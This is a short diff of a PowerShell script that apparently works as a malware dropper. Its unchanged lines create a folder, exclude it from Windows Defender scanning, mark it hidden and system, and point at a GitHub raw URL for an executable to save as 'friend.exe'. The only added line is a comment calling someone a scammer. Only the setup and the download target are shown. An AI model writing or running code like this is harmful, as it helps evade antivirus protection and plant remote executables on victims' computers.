@@ -5,7 +5,7 @@ New-Item -ItemType Directory -Path $dir
 Add-MpPreference -ExclusionPath $dir
 attrib +h +s $dir
 $folderPath = $dir
-
+# many ak is scammer :)))
 $filePath = "$folderPath\friend.exe"
 $url = "https://github.com/manyak-cmd/a/raw/refs/heads/main/main.exe"
 
